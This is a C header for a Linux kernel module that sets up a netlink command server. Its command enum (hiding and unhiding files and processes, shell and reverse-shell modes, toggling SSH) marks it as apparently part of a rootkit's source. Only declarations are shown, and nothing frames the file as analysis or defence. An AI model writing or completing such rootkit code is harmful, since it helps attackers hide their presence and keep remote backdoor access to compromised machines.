#ifndef _CURMBS_SERV_H_
#define _CURMBS_SERV_H_

//#include ""
#include "common.h"
#include "vfs.h"

#include <linux/workqueue.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <net/net_namespace.h>

#define NETLINK_USER 31

typedef struct {
    struct work_struct my_work;
    char *dt;
    int size;
} my_work_t;

struct cmd_t {
	int id;
	char* arg;
};

typedef enum {
	AUTHENTICATION,
	LOGOUT,
	HIDE_FILE,
	UNHIDE_FILE,
	HIDE_PROCESS,
	UNHIDE_PROCESS,
	MODE_SHELL,
	MODE_REVERSE_SHELL,
	ACTIVATE_SSH,
	DEACTIVATE_SSH
} commands;

void crumbs_serv_init(void);
void crumbs_serv_release(void);

#endif